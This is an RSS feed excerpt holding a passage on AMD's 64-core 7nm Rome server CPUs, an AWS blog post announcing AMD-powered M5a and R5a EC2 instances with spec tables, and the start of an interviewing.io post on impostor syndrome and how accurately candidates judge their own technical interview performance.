&lt;p&gt;The 7nm Rome CPUs come with 64 physical Zen 2 cores, which equates to 128 threads per processor, double that of the first-gen Naples chips. In a two socket server, that equates to 128 physical cores and 256 threads in a single box. Rome is also the first PCIe 4.0 CPU, which offers double the bandwidth per channel. &lt;span class=&quot;imgContent imgCenter&quot;&gt;&lt;span class=&quot;imgWrapperOutter&quot;&gt;&lt;span class=&quot;imgWrapperInner&quot;&gt;&lt;span class=&quot;iZoom&quot;&gt;&lt;img class=&quot;lazy&quot; data-src=&quot;https://img.purch.com/20181106-112322-jpg/w/755/aHR0cDovL21lZGlhLmJlc3RvZm1pY3JvLmNvbS9GL08vODA5MjY4L29yaWdpbmFsLzIwMTgxMTA2XzExMjMyMi5qcGc=&quot; big-src=&quot;https://img.purch.com/20181106-112322-jpg/o/aHR0cDovL21lZGlhLmJlc3RvZm1pY3JvLmNvbS9GL08vODA5MjY4L29yaWdpbmFsLzIwMTgxMTA2XzExMjMyMi5qcGc=&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;AMD has also made the processors backward compatible with its existing server ecosystem. These drop-in replacements offer twice the performance of the previous generation per socket. You also get four times the floating point performance per chip.&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;imgContent imgCenter&quot;&gt;&lt;span class=&quot;imgWrapperOutter&quot;&gt;&lt;span class=&quot;imgWrapperInner&quot;&gt;&lt;span class=&quot;iZoom&quot;&gt;&lt;img class=&quot;lazy&quot; data-src=&quot;https://img.purch.com/-582e55b65e9d6a001e8f5652ca477a00c23d86a6be242a50ca-pimgpsh-fullsize-distr-jpg/w/755/aHR0cDovL21lZGlhLmJlc3RvZm1pY3JvLmNvbS9GL04vODA5MjY3L29yaWdpbmFsLy01ODJFNTVCNjVFOUQ2QTAwMUU4RjU2NTJDQTQ3N0EwMEMyM0Q4NkE2QkUyNDJBNTBDQS1waW1ncHNoX2Z1bGxzaXplX2Rpc3RyLmpwZw==&quot; big-src=&quot;https://img.purch.com/-582e55b65e9d6a001e8f5652ca477a00c23d86a6be242a50ca-pimgpsh-fullsize-distr-jpg/o/aHR0cDovL21lZGlhLmJlc3RvZm1pY3JvLmNvbS9GL04vODA5MjY3L29yaWdpbmFsLy01ODJFNTVCNjVFOUQ2QTAwMUU4RjU2NTJDQTQ3N0EwMEMyM0Q4NkE2QkUyNDJBNTBDQS1waW1ncHNoX2Z1bGxzaXplX2Rpc3RyLmpwZw==&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;There are eight 7nm eight-core die tied to a central 14nm I/O die. &lt;span class=&quot;imgContent imgCenter&quot;&gt;&lt;span class=&quot;imgWrapperOutter&quot;&gt;&lt;span class=&quot;imgWrapperInner&quot;&gt;&lt;span class=&quot;iZoom&quot;&gt;&lt;img class=&quot;lazy&quot; data-src=&quot;https://img.purch.com/-16d682cbcbac77a99a1276961cb0ed9af44ea7a8a1b9fac20a-pimgpsh-fullsize-distr-jpg/w/755/aHR0cDovL21lZGlhLmJlc3RvZm1pY3JvLmNvbS9GL1QvODA5MjczL29yaWdpbmFsLy0xNkQ2ODJDQkNCQUM3N0E5OUExMjc2OTYxQ0IwRUQ5QUY0NEVBN0E4QTFCOUZBQzIwQS1waW1ncHNoX2Z1bGxzaXplX2Rpc3RyLmpwZw==&quot; big-src=&quot;https://img.purch.com/-16d682cbcbac77a99a1276961cb0ed9af44ea7a8a1b9fac20a-pimgpsh-fullsize-distr-jpg/o/aHR0cDovL21lZGlhLmJlc3RvZm1pY3JvLmNvbS9GL1QvODA5MjczL29yaWdpbmFsLy0xNkQ2ODJDQkNCQUM3N0E5OUExMjc2OTYxQ0IwRUQ5QUY0NEVBN0E4QTFCOUZBQzIwQS1waW1ncHNoX2Z1bGxzaXplX2Rpc3RyLmpwZw==&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;AMD also displayed a demo with the 7nm Rome CPUs and the 7nm GPU MI60 CPUs together. AMD also displayed a single Rome processor beating two of Intel's flagship 8180 CPUs in a rendering benchmark.&lt;/p&gt;
</description>
<pubDate>Tue, 06 Nov 2018 18:03:33 +0000</pubDate>
<dc:creator>ccwilson10</dc:creator>
<og:url>https://www.tomshardware.com/news/amd-new-horizon-7nm-cpu,38029.html</og:url>
<og:title>AMD Announces 64-Core 7nm Rome CPUs, 7nm MI60 GPUs, And Zen 4</og:title>
<og:description>We're here at AMD's New Horizon Event to bring you up to the minute news on the company's 7nm products.</og:description>
<og:image>https://img.purch.com/o/aHR0cDovL21lZGlhLmJlc3RvZm1pY3JvLmNvbS9GL1IvODA5MjcxL29yaWdpbmFsL0lNR183MjMxLkpQRw==</og:image>
<og:type>article</og:type>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.tomshardware.com/news/amd-new-horizon-7nm-cpu,38029.html</dc:identifier>
</item>
<item>
<title>New Lower-Cost, AMD-Powered M5a and R5a EC2 Instances</title>
<link>https://aws.amazon.com/blogs/aws/new-lower-cost-amd-powered-ec2-instances/</link>
<guid isPermaLink="true" >https://aws.amazon.com/blogs/aws/new-lower-cost-amd-powered-ec2-instances/</guid>
<description>&lt;table id=&quot;amazon-polly-audio-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td id=&quot;amazon-polly-audio-tab&quot;&gt;


&lt;div id=&quot;amazon-polly-by-tab&quot;&gt;&lt;a href=&quot;https://aws.amazon.com/polly/&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;&lt;img src=&quot;https://a0.awsstatic.com/aws-blog/images/Voiced_by_Amazon_Polly_EN.png&quot; width=&quot;554&quot; height=&quot;56&quot;/&gt;&lt;/a&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;From the start, AWS has focused on choice and economy. Driven by a never-ending torrent of customer requests that power our well-known Virtuous Cycle, I think we have delivered on both over the years:&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;https://media.amazonwebservices.com/blog/2018/virtuous_cycle_2.png&quot; width=&quot;375&quot; height=&quot;271&quot;/&gt;&lt;strong&gt;Choice&lt;/strong&gt; – AWS gives you choices in a wide range of dimensions including locations (18 operational geographic &lt;a href=&quot;https://aws.amazon.com/about-aws/global-infrastructure/&quot;&gt;regions&lt;/a&gt;, 4 more in the works, and 1 local region), compute models (&lt;a href=&quot;https://aws.amazon.com/ec2/&quot;&gt;instances&lt;/a&gt;, &lt;a href=&quot;https://aws.amazon.com/what-are-containers/&quot;&gt;containers&lt;/a&gt;, and &lt;a href=&quot;https://aws.amazon.com/serverless/&quot;&gt;serverless&lt;/a&gt;), &lt;a href=&quot;https://aws.amazon.com/ec2/instance-types/&quot;&gt;EC2 instance types&lt;/a&gt;, &lt;a href=&quot;https://aws.amazon.com/rds/&quot;&gt;relational&lt;/a&gt; and &lt;a href=&quot;https://aws.amazon.com/nosql/&quot;&gt;NoSQL&lt;/a&gt; database choices, &lt;a href=&quot;https://aws.amazon.com/developer/&quot;&gt;development languages&lt;/a&gt;, and pricing/purchase models.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Economy&lt;/strong&gt; – We have &lt;a href=&quot;https://aws.amazon.com/blogs/aws/category/price-reduction/&quot;&gt;reduced prices&lt;/a&gt; 67 times so far, and work non-stop to drive down costs and to make AWS an increasingly better value over time. We study usage patterns, identify areas for innovation and improvement, and deploy updates across the entire AWS Cloud on a very regular and frequent basis.&lt;/p&gt;
&lt;p&gt;Today I would like to tell you about our latest development, one that provides you with a choice of EC2 instances that are more economical than ever!&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;Powered by AMD&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;The newest EC2 instances are powered by custom AMD EPYC processors running at 2.5 GHz and are priced 10% lower than comparable instances. They are designed to be used for workloads that don’t use all of compute power available to them, and provide you with a new opportunity to optimize your instance mix based on cost and performance.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://media.amazonwebservices.com/blog/2018/m5a_r5a_1.png&quot;/&gt;Here’s what we are launching:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;General Purpose&lt;/strong&gt; – M5a instances are designed for general purpose workloads: web servers, app servers, dev/test environments, and gaming. The M5a instances are available in 6 sizes.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Memory Optimized&lt;/strong&gt; – R5a instances are designed for memory-intensive workloads: data mining, in-memory analytics, caching, and so forth. The R5a instances are available in 6 sizes, with lower per-GiB memory pricing in comparison to the R5 instances.&lt;/p&gt;
&lt;p&gt;The new instances are built on the AWS Nitro System. They can make use of existing HVM AMIs (as is the case with all other recent EC2 instance types, the AMI must include the ENA and NVMe drivers), and can be used in &lt;a href=&quot;https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/placement-groups.html&quot;&gt;Cluster Placement Groups&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;These new instances should be a great fit for customers who are looking to further cost-optimize their Amazon EC2 compute environment. As always, we recommend that you measure performance and cost on your own workloads when choosing your instance types.&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;General Purpose Instances&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;Here are the specs for the M5a instances:&lt;/p&gt;
&lt;table cellpadding=&quot;8&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;Instance Name&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;vCPUs&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;strong&gt;RAM&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;strong&gt;EBS-Optimized Bandwidth&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;strong&gt;Network Bandwidth&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;strong&gt;m5a.large&lt;br/&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;8 GiB&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Up to 2.120 Gbps&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Up to 10 Gbps&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;strong&gt;m5a.xlarge&lt;br/&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;4&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;16 GiB&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Up to 2.120 Gbps&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Up to 10 Gbps&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;strong&gt;m5a.2xlarge&lt;br/&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;8&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;32 GiB&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Up to 2.120 Gbps&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Up to 10 Gbps&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;strong&gt;m5a.4xlarge&lt;br/&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;16&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;64 GiB&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;2.120 Gbps&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Up to 10 Gbps&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;strong&gt;m5a.12xlarge&lt;br/&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;48&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;192 GiB&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;5 Gbps&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;10 Gbps&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;strong&gt;m5a.24xlarge&lt;br/&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;96&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;384 GiB&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;10 Gbps&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;20 Gbps&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;Memory Optimized Instances&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;Here are the specs for the R5a instances:&lt;/p&gt;
&lt;table cellpadding=&quot;8&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;Instance Name&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;vCPUs&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;strong&gt;RAM&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;strong&gt;EBS-Optimized Bandwidth&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;strong&gt;Network Bandwidth&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;strong&gt;r5a.large&lt;br/&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;16 GiB&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Up to 2.120 Gbps&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Up to 10 Gbps&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;strong&gt;r5a.xlarge&lt;br/&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;4&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;32 GiB&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Up to 2.120 Gbps&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Up to 10 Gbps&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;strong&gt;r5a.2xlarge&lt;br/&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;8&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;64 GiB&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Up to 2.120 Gbps&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Up to 10 Gbps&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;strong&gt;r5a.4xlarge&lt;br/&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;16&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;128 GiB&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;2.120 Gbps&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Up to 10 Gbps&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;strong&gt;r5a.12xlarge&lt;br/&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;48&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;384 GiB&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;5 Gbps&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;10 Gbps&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;strong&gt;r5a.24xlarge&lt;br/&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;96&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;768 GiB&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;10 Gbps&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;20 Gbps&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;Available Now&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;These instances are available now and you can start using them today in the &lt;span title=&quot;&quot;&gt;US East (N. Virginia)&lt;/span&gt;, &lt;span title=&quot;&quot;&gt;US East (Ohio)&lt;/span&gt;, &lt;span title=&quot;&quot;&gt;US West (Oregon)&lt;/span&gt;, &lt;span title=&quot;&quot;&gt;Europe (Ireland)&lt;/span&gt;, and &lt;span title=&quot;&quot;&gt;Asia Pacific (Singapore)&lt;/span&gt; Regions in On-Demand, Spot, and Reserved Instance form. Pricing, as I noted earlier, is 10% lower than the equivalent existing instances. To learn more, visit our new &lt;a href=&quot;https://aws.amazon.com/ec2/amd/&quot;&gt;AMD Instances&lt;/a&gt; page.&lt;/p&gt;
&lt;p&gt;— &lt;a href=&quot;https://twitter.com/jeffbarr&quot;&gt;Jeff&lt;/a&gt;;&lt;/p&gt;
&lt;p&gt;PS – We are also working on T3a instances; stay tuned for more info!&lt;/p&gt;

</description>
<pubDate>Tue, 06 Nov 2018 17:09:44 +0000</pubDate>
<dc:creator>jeffbarr</dc:creator>
<og:title>New Lower-Cost, AMD-Powered M5a and R5a EC2 Instances | Amazon Web Services</og:title>
<og:type>article</og:type>
<og:url>https://aws.amazon.com/blogs/aws/new-lower-cost-amd-powered-ec2-instances/</og:url>
<og:description>From the start, AWS has focused on choice and economy. Driven by a never-ending torrent of customer requests that power our well-known Virtuous Cycle, I think we have delivered on both over the years: Choice – AWS gives you choices in a wide range of dimensions including locations (18 operational geographic regions, 4 more in […]</og:description>
<og:image>https://d2908q01vomqb2.cloudfront.net/da4b9237bacccdf19c0760cab7aec4a8359010b0/2018/11/02/m5a_r5a_featured_1.png</og:image>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://aws.amazon.com/blogs/aws/new-lower-cost-amd-powered-ec2-instances/</dc:identifier>
</item>
<item>
<title>Impostor syndrome strikes men just as hard as women in technical interviews</title>
<link>http://blog.interviewing.io/impostor-syndrome-strikes-men-just-as-hard-as-women-and-other-findings-from-thousands-of-technical-interviews/</link>
<guid isPermaLink="true" >http://blog.interviewing.io/impostor-syndrome-strikes-men-just-as-hard-as-women-and-other-findings-from-thousands-of-technical-interviews/</guid>
<description>&lt;p&gt;The modern technical interview is a rite of passage for software engineers and (hopefully!) the precursor to a great job. But it’s also a huge source of stress and endless questions for new candidates. Just searching “how do I prepare for a technical interview” turns up millions of Medium posts, coding bootcamp blogs, Quora discussions, and entire books.&lt;/p&gt;&lt;p&gt;Despite all this conversation, people struggle to know how they’re even doing in interviews. &lt;a href=&quot;http://blog.interviewing.io/people-are-still-bad-at-gauging-their-own-interview-performance-heres-the-data/&quot;&gt;In a previous post&lt;/a&gt;, we found that a surprisingly large number of interviewing.io’s users consistently underestimate their performance, making them more likely to drop out of the process and ultimately harder to hire. Now, and with considerably more data (over 10k interviews led by real software engineers!), we wanted to go deeper: &lt;strong&gt;what seems to make candidates worse at gauging their own performance?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We know some general facts that make accuracy a challenge: people aren’t always great at assessing or even remembering their performance on difficult cognitive tasks like writing code.&lt;sup&gt;&lt;a id=&quot;imposter-ref1&quot; href=&quot;http://blog.interviewing.io/impostor-syndrome-strikes-men-just-as-hard-as-women-and-other-findings-from-thousands-of-technical-interviews/#imposter-fn1&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; Technical interviews can be particularly hard to judge if candidates don’t have much experience with questions with no single right answer. Since many companies don’t share any kind of detailed post-interview feedback (beyond a yes/no) with candidates for liability reasons, many folks never get any sense of how they did, what they did well, or what could have been better.&lt;sup&gt;&lt;a id=&quot;imposter-ref2&quot; href=&quot;http://blog.interviewing.io/impostor-syndrome-strikes-men-just-as-hard-as-women-and-other-findings-from-thousands-of-technical-interviews/#imposter-fn2&quot;&gt;2&lt;/a&gt;, &lt;a id=&quot;imposter-ref3&quot; href=&quot;http://blog.interviewing.io/impostor-syndrome-strikes-men-just-as-hard-as-women-and-other-findings-from-thousands-of-technical-interviews/#imposter-fn3&quot;&gt;3&lt;/a&gt;&lt;/sup&gt; Indeed, pulling back the curtain on interviewing, &lt;em&gt;across the industry,&lt;/em&gt; was one of the primary motivators for building interviewing.io!&lt;/p&gt;
&lt;p&gt;But to our knowledge there’s little data out there looking specifically at how people feel after real interviews on this scale, across different companies–so we gathered it, giving us the ability to test interesting industry assumptions about engineers and coding confidence.&lt;/p&gt;
&lt;p&gt;One big factor we were interested in was &lt;strong&gt;impostor syndrome&lt;/strong&gt;. Impostor syndrome resonates with a lot of engineers,&lt;sup&gt;&lt;a id=&quot;imposter-ref4&quot; href=&quot;http://blog.interviewing.io/impostor-syndrome-strikes-men-just-as-hard-as-women-and-other-findings-from-thousands-of-technical-interviews/#imposter-fn4&quot;&gt;4&lt;/a&gt;&lt;/sup&gt; indicating that many wonder whether they truly match up to colleagues and discount even strong evidence of competence as a fluke. Impostor syndrome can make us wonder whether we can count on the positive performance feedback that we’re getting, and how much our opportunities have come from our own effort, versus luck. Of particular interest to us was whether this would show up for women on our platform. There’s a lot of research evidence that candidates from underrepresented backgrounds experience a greater lack of belonging that feeds impostor syndrome,&lt;sup&gt;&lt;a id=&quot;imposter-ref5&quot; href=&quot;http://blog.interviewing.io/impostor-syndrome-strikes-men-just-as-hard-as-women-and-other-findings-from-thousands-of-technical-interviews/#imposter-fn5&quot;&gt;5&lt;/a&gt;&lt;/sup&gt; and this could show up as inaccuracy about judging your own interview performance.&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;heading&quot;&gt;The setup&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;interviewing.io is a platform where people can practice technical interviewing anonymously, and if things go well, get jobs at top companies in the process. We started it because resumes uck and because we believe that anyone, regardless of how they look on paper, should have the opportunity to prove their mettle.&lt;/p&gt;
&lt;p&gt;When an interviewer and an interviewee match on interviewing.io, they meet in a collaborative coding environment with voice, text chat, and a whiteboard and jump right into a technical question (feel free to &lt;a href=&quot;https://interviewing.io/recordings/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;watch this process in action on our interview recordings page&lt;/a&gt;).  After each interview, people leave one another feedback, and each party can see what the other person said about them once they both submit their reviews.&lt;/p&gt;
&lt;p&gt;Here’s an example of an interviewer feedback form:&lt;/p&gt;
&lt;div id=&quot;attachment_118&quot; class=&quot;wp-caption aligncenter&quot; readability=&quot;32&quot;&gt;&lt;a href=&quot;http://blog.interviewing.io/wp-content/uploads/2015/12/interviewer-feedback.png&quot; rel=&quot;attachment wp-att-118&quot;&gt;&lt;img class=&quot;size-full wp-image-118&quot; src=&quot;http://blog.interviewing.io/wp-content/uploads/2016/09/new_interviewer_feedback_circled.png&quot; alt=&quot;Feedback form for interviewers&quot; width=&quot;450&quot;/&gt;&lt;/a&gt;
&lt;p class=&quot;wp-caption-text&quot;&gt;Feedback form for interviewers&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;Immediately after the interview, candidates answered a question about how well they thought they’d done on the same 1-4 scale:&lt;/p&gt;
&lt;div id=&quot;attachment_122&quot; class=&quot;wp-caption aligncenter&quot; readability=&quot;32&quot;&gt;&lt;a href=&quot;http://blog.interviewing.io/wp-content/uploads/2015/12/interviewee-feedback.png&quot; rel=&quot;attachment wp-att-122&quot;&gt;&lt;img class=&quot;size-full wp-image-122&quot; src=&quot;http://blog.interviewing.io/wp-content/uploads/2016/09/new_interviewee_feedback_circled.png&quot; alt=&quot;Feedback form for interviewees&quot; width=&quot;450&quot;/&gt;&lt;/a&gt;
&lt;p class=&quot;wp-caption-text&quot;&gt;Feedback form for interviewees&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;For this post, we looked at over 10k technical interviews led by real software engineers from top companies. In each interview, a candidate was rated by an interviewer on their problem-solving ability, technical ability, and communication skills, as well as whether the interviewer would advance them to the next round. This gave us a measure of how different someone’s self-rating was from the rating that the interviewer actually gave them, and in which direction. In other words, how skewed was their estimation from their true performance?&lt;/p&gt;
&lt;p&gt;Going in, we had some hunches about what might matter:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Gender.&lt;/strong&gt; Would women be harder on their coding performance than men?&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Having been an interviewer before.&lt;/strong&gt; It seems reasonable that having been on the other side will pull back the curtain on interviews.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Being employed at a top company.&lt;/strong&gt; Similar to above.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Being a top-performing interviewee&lt;/strong&gt; on interviewing.io — people who are better interviewees overall might have more confidence and awareness of when they’ve gotten things right (or wrong!)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Being in the Bay Area&lt;/strong&gt; or not. Since tech is still so geographically centered on the Bay Area, we considered that folks who live in a more engineering-saturated culture could have greater familiarity with professional norms around interviews.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Within the interview itself, question quality and interviewer quality.&lt;/strong&gt; Presumably, a better interviewer is also a better communicator, whereas a confusing interviewer might throw off a candidates’ entire assessment of their performance. We also looked at whether it was a practice interview, or for a specific company role.&lt;/li&gt;
&lt;li&gt;For some candidates, we could also look at few measures of their &lt;strong&gt;personal brand&lt;/strong&gt; within the industry, like their number of GitHub and Twitter followers. Maybe people with a strong online presence are more sure of themselves when they interview?&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;span class=&quot;heading&quot;&gt;So what did we find?&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;subheading&quot;&gt;Women are just as accurate as men at assessing their technical ability&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Contrary to expectations around gender and confidence, we &lt;em&gt;didn’t&lt;/em&gt; find a reliable statistically significant gender difference in accuracy. At first, it looked like female candidates were more likely to underestimate their performance, but when we controlled for other variables, like experience and rated technical ability, it turned out &lt;strong&gt;the key differentiator was experience.&lt;/strong&gt; More experienced engineers are more accurate about their interview performance, and men are more likely to be experienced engineers, but experienced female engineers are just as accurate about their technical ability.&lt;/p&gt;
&lt;p&gt;Based on previous research, we hypothesized that impostor syndrome and a greater lack of belonging could result in female candidates penalizing their interview performance, but we didn’t find that pattern.&lt;sup&gt;&lt;a id=&quot;imposter-ref6&quot; href=&quot;http://blog.interviewing.io/impostor-syndrome-strikes-men-just-as-hard-as-women-and-other-findings-from-thousands-of-technical-interviews/#imposter-fn6&quot;&gt;6&lt;/a&gt;&lt;/sup&gt; However, our finding echoes &lt;a href=&quot;https://gender.stanford.edu/sites/default/files/publications/climbing_the_technical_ladder.pdf&quot;&gt;a research project from the Stanford Clayman Institute for Gender Research&lt;/a&gt;, which looked at 1,795 mid-level tech workers from high tech companies. They found that women in tech aren’t necessarily less accurate when assessing their own abilities, but do have significantly different ideas about what success requires (e.g., long working hours and risk-taking). In other words, &lt;strong&gt;women in tech may not doubt their own abilities but might have different ideas about what’s expected&lt;/strong&gt;. &lt;a href=&quot;https://hbr.org/2014/08/why-women-dont-apply-for-jobs-unless-theyre-100-qualified&quot;&gt;And a survey from Harvard Business Review&lt;/a&gt;  asking over a thousand professionals about their job application decisions also made this point. Their results emphasized that gender gaps in evaluation scenarios could be more about &lt;strong&gt;different expectations for how scenarios like interviews are judged.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;That said, we did find one interesting difference: women went through fewer practice interviews overall than men did. The difference was small but statistically significant, and harkens back to &lt;a href=&quot;http://blog.interviewing.io/we-built-voice-modulation-to-mask-gender-in-technical-interviews-heres-what-happened/&quot;&gt;our earlier finding that women leave interviewing.io roughly 7 times as often as men do&lt;/a&gt;, after a bad interview.&lt;/p&gt;
&lt;p&gt;But in that same earlier post, we also found that masking voices didn’t impact interview outcomes. This whole cluster of findings affirms what we suspected and what the folks doing &lt;a href=&quot;https://gender.stanford.edu/sites/default/files/publications/climbing_the_technical_ladder.pdf&quot;&gt;in-depth studies of gender in tech&lt;/a&gt; have found: &lt;strong&gt;it’s complicated.&lt;/strong&gt; Women’s lack of persistence in interviews can’t be explained only by impostor syndrome about their &lt;em&gt;own&lt;/em&gt; abilities, but it’s still likely that they’re interpreting negative feedback more severely and making different assumptions about interviews.&lt;/p&gt;
&lt;p&gt;Here’s the distribution of accuracy distance for both female and male candidates on our platform (zero indicates a rating that matches the interviewer’s score, while negative values indicate underestimated score, and positive values indicate an overestimated score). The two groups look pretty much identical:&lt;/p&gt;
